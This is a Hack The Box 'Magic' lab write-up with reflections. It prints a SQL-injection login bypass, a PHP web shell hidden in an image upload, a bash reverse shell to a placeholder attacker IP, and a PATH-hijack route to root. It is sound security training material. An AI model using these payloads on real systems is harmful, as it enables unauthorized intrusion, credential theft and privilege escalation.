# HTB Magic — Learning Writeup & Post-Lab Reflection

> [!NOTE]
> This writeup documents my learning process while solving the HTB Magic machine. It includes my reasoning flow, mistakes, corrections, and concepts I had to revisit during the lab.

---

## 🖥️ Machine Information

*   **Machine Name:** Magic
*   **Platform:** Hack The Box
*   **Difficulty:** Medium

---

## ⛓️ General Attack Chain

```text
nmap scan
 └── web enumeration
      └── SQLi authentication bypass
           └── upload bypass
                └── gain RCE
                     └── enumerate OS
                          └── extract MySQL credentials
                               └── database dump
                                    └── credential reuse
                                         └── user pivot
                                              └── SUID enumeration
                                                   └── PATH hijack
                                                        └── root
```

---

## 🏁 Phase 1 — Port Scanning & Initial Enumeration

### **Nmap Scan**
I started the initial probe using the standard scanner tool:
```bash
nmap <target_ip>
```

The scan revealed only two active entry points:
*   **HTTP** (Port 80)
*   **SSH** (Port 22)

Since SSH required existing credentials or a public key, the HTTP service became my primary attack surface.

> [!IMPORTANT]
> **Key Networking Lesson:** `nmap` scans services that are externally reachable from the attacker machine over the network. Knowing the target IP alone is not enough; the attacker must also be actively connected to the correct lab network/VPN environment to route traffic successfully.

---

## 🔍 Phase 2 — Web Enumeration

I used **Burp Suite** to intercept and analyze HTTP traffic. Static directory endpoints did not expose any input fields:
*   `/images`
*   `/index.php`

Because these routes lacked entry points, I shifted my focus entirely to the web login page, which exposed two potential input vectors: **username** and **password**.

---

## 💉 Phase 3 — SQL Injection Discovery

### **Baseline Testing**
I first tested the fields with random credentials to establish a **false baseline** and observe structural application signals:
*   **Status Code:** `200`
*   **Response Length:** `4273`
*   **Response Body:** `"Wrong username or password"`

### **SQLi Testing**
Next, I injected standard logical operators against both fields separately:
*   `' AND 1=1--`
*   `' AND 1=2--`

Initially, all payloads produced identical responses:
*   **Status Code:** `200`
*   **Response Length:** `4221`
*   **Response Body:** *No error message displayed*

This variance in response length confirmed that the SQL syntax was altering the backend database logic, but my payload formatting was still breaking the query parser.

### **SQL Comment Syntax Correction**
I realized that MySQL comment syntax requires a trailing whitespace after the double-dash (`--`). 

*   **Incorrect:** `' OR 1=1--` (Becomes `--password=`, which fails to activate comment parsing)
*   **Correct:** `' OR 1=1-- -` 

The trailing space explicitly tells the database engine to drop the rest of the original query structure.

### **Authentication Bypass**
Applying the corrected syntax successfully forced a logical true condition, bypassed the login dashboard, and granted access to the internal file upload panel:
```sql
' OR 1=1-- -
```

---

## 📤 Phase 4 — Upload Bypass & PHP Execution

### **Upload Validation Testing**
The upload configuration explicitly restricted file types to: `JPG`, `JPEG`, and `PNG`. 

I first attempted to upload a blank file renamed to `test.jpg`, but the operation failed. This indicated that the server was validating file headers (magic bytes) rather than checking the extension alone.

### **Image + PHP Payload**
To circumvent this check, I appended a PHP execution string to the metadata structure of a valid image file and double-extended the name:
```bash
# Appending the payload to a legitimate image file
echo '<?php echo "HELLO"; ?>' >> legitimate_image.jpg
mv legitimate_image.jpg test.php.jpg
```

The server successfully accepted the file. 

> [!TIP]
> **Critical Distinction:** Upload validation success does **NOT** automatically mean code execution. The backend web server rules must still route that specific file structure to the runtime interpreter environment.

### **PHP Execution & RCE Validation**
When I requested the uploaded file directly, the web server processed it using its PHP handler rules. The embedded script executed and rendered `"HELLO"`.

To escalate this to **Remote Command Execution (RCE)**, I updated the payload to pass operating system instructions through an input parameter:
```php
<?php system($_GET['cmd']); ?>
```

Targeting the parameter verified that the system utility could pass internal instructions directly to the underlying Linux OS shell.

---

## 🕵️ Phase 5 — Enumeration as www-data

Using the live RCE vector, I audited the filesystem structure and found hardcoded application credentials located in the configuration directory:
*   **File Path:** `/var/www/Magic/db.php5`
*   **Extracted Credentials:** `theseus : iamkingtheseus`

---

## 📊 Phase 6 — Internal Service Discovery & Database Enumeration

> [!WARNING]
> **Avoid Faulty Assumptions:** I initially assumed that web dashboard credentials would automatically match local system or database root accounts. Web, database, and SSH systems maintain entirely separate authorization boundaries, even though developers frequently reuse secrets across them.

### **Internal Service Discovery**
I checked active local socket listeners from inside the target environment:
```bash
ss -lnt
```

The output revealed an active internal database port:
*   **Port:** `3306` (MySQL)

This highlighted an essential infrastructure concept: **External vs. Internal Visibility**. While `nmap` only flags externally exposed ports, internal auditing commands like `ss` display components bounded exclusively to the local loopback interface.

### **Database Dump**
I leveraged the native migration utility to print the schemas and table contents quickly:
```bash
mysqldump -u theseus -piamkingtheseus Magic
```

The resulting SQL script exposed cleartext administrative records:
*   **Admin Account:** `admin : Th3s3usW4sK1ng`

---

## 🐚 Phase 7 — Reverse Shell & User Pivot

### **One-Shot RCE Limitations**
I found that basic web-parameter RCE spawns an independent, non-persistent subprocess for each HTTP transaction. Environmental commands like changing directories do not persist:
```bash
# This change is lost as soon as the HTTP response returns
cd /tmp 
```

While structural file modifications persist across the filesystem, session variables and operational pathways disappear between requests.

### **Reverse Shell Establishment**
To stabilize connection state tracking, I set up a persistent netcat listener on my attacker machine:
```bash
nc -lnvp 1234
```

Then, I executed a network redirection string through the web entry point to force an active shell process back to my listener:
```bash
bash -c 'bash -i >& /dev/tcp/<attacker_ip>/1234 0>&1'
```

### **PTY Upgrade**
Once connected, the raw stream lacked terminal control features. I upgraded the shell environment using Python's pseudo-terminal system and updated the terminal definition:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```
This allowed terminal utilities like `su` or `vim` to process control sequences correctly.

### **User Pivot**
With a stable terminal, I pivoted from the service account to the local user context via credential reuse:
```bash
su theseus
# Password: Th3s3usW4sK1ng
```

---

## 👑 Phase 8 — Privilege Escalation

### **SUID Enumeration**
I searched the filesystem for binaries running with elevated root permissions (SUID bit set):
```bash
find / -perm -4000 -type f 2>/dev/null
```

Among the results, a custom binary located at `/bin/sysinfo` looked unusual. I ran a diagnostic trace on its execution flow:
```bash
strace -f /bin/sysinfo
```
The logs showed that `sysinfo` calls an external system tool named `lshw` **without specifying its absolute system path** (e.g., it calls `lshw` instead of `/usr/bin/lshw`).

### **PATH Hijack**
This functional oversight allowed me to execute a path interception attack. I manipulated the system search sequence to prioritize the temporary folder:
```bash
export PATH=/tmp:$PATH
```

Next, I wrote a malicious payload into `/tmp`, named it `lshw`, and granted it execution permissions:
```bash
echo '/bin/bash -p' > /tmp/lshw
chmod +x /tmp/lshw
```

When I executed the privileged `/bin/sysinfo` binary, it searched the modified `$PATH` environment variable, found my malicious script inside `/tmp` first, and executed it with root authority.

---

#  🧠 What I Have Learnt:

1. **Difference Between Nmap and SS**
   * Nmap is used to scan for externally reachable services/ports which an attacker can connect to and control remotely over the network.
   * On the other hand, ss is used to list out all the services that are connected internally of a machine. 

2. **Process Local State**
   * I understand better about process local state.
   * When a command via RCE reaches the web server as an HTTP request, the web server will then take it as a process.
   * This process will begin to run from the default working directory.
   * As the process is running, the supplied command will be executed.
   * After the supplied command is executed, the process ends.
   * *Example A:* A command, `cd /var/www/magic`, is sent via RCE. It will reach the web server as an HTTP request. Then, the web server will take it as a process, process A. When it is executed in the OS, process A will start from the default working directory from how the web app/server launches them (`/var/www/magic/images` as an example), then the process will change directory to the `/var/www/magic` directory, then the process is done. 
   * *Example B:* Another new command, `cd /var/www/magic && ls -lah`, is sent via RCE. This command is another new process, process B. When executed in the OS, it will start from the default working directory, `/var/www/magic/images`, then the process will change directory to `/var/www/magic` and list all the files and directories, then the process ends. 
   * *Example C:* Another new command, `cd /var/www/magic && touch test`, is sent via RCE. This command is a new process, process C. When executed in the OS, it will start from the default working directory, `/var/www/magic/images`, then the process will change directory to `/var/www/magic` and create a file called test, then the process ends. 
   * *Filesystem Persistence:* Besides, I also learnt that Linux itself does not 'forget' things. Continuing from the example command, `cd /var/www/magic && touch test`, even though the process ends and exits, the created file, test, will still remain because the filesystem itself was modified persistently.

3. **PHP Interpreter vs. system()**
   * I understand the difference between the PHP interpreter and `system()`.
   * After a file is successfully uploaded, the web server will follow the configuration and decide whether the file will be routed to the PHP interpreter.
   * If it routes to the PHP interpreter, then the interpreter will follow the handler rules, and decide whether the PHP payload in the file will be executed.
   * A PHP payload such as `<?php echo "HELLO"; ?>` will be interpreted and show the output, `HELLO`.
   * If there is a function `system()` inside the payload, then the PHP interpreter will execute that `system()` function, and the `system()` function will then ask the operating system to execute the supplied command inside the `system()`.

4. **Reverse Shell Payloads**
   * I have learnt about the reverse shell payload.
   * At first, the attacker needs to start a listener by executing `nc -lnvp <port number>` on his own terminal.
   * Then, the attacker needs to upload the reverse shell payload, `bash -c 'bash -i >& /dev/tcp/attacker_ip/port_number 0>&1'`, via RCE to the target terminal.
   * This payload basically means establish a TCP connection with the listener, then the output from the target's interactive shell will be redirected through that TCP connection, so the shell output is sent to the attacker’s netcat listener and displayed in the attacker terminal.
   * At the same time, the `0>&1` part makes stdin use the same communication channel as stdout, so keyboard input from the attacker side can travel back through the TCP connection into the target shell.
   * The reverse shell payload is important and useful because as long as the bash shell process remains alive and attached to the same TCP connection, the attacker can continuously type commands and receive output interactively instead of sending separate one-shot HTTP requests.

5. **Pseudo-TTY Upgrade**
   * I also learnt about some new commands or payloads.
   * The command `python3 -c 'import pty;pty.spawn("/bin/bash")'` is used so that the shell process can be run in a pseudo tty.
   * A PTY is a software-simulated terminal that allows the shell to run as if in a real terminal.
   * This gives a better interactive behaviour. 

6. **Vulnerability vs. Mechanism**
   * I also understand that a reverse shell itself is not a vulnerability.
   * A reverse shell simply means that a persistent TCP connection is established between the attacker's listener and the target shell process.
   * The attacker's keyboard input can be transported via that TCP connection and reaches the target shell process to be executed.
   * Also, the output from the target's shell process uses the same communication channel to reach the attacker listener and display on the attacker screen.
   * The real vulnerability is RCE.
   * The attacker's input command can successfully reach the web server as an HTTP request, then routes to the interpreter and be executed.
   * This can be done due to the weak or insufficient validation by the server.



---

## ⚠️ Identified Personal Weaknesses
*   Shallow or weak initial networking context
*   Over-reliance on HTTP content length variations
*   Debugging issues at the wrong environmental layer
*   Imprecise or unstable exploit syntax formatting
*   Heavy payload dependencies
*   Misunderstanding shell tracking states
*   Making premature architectural assumptions

---

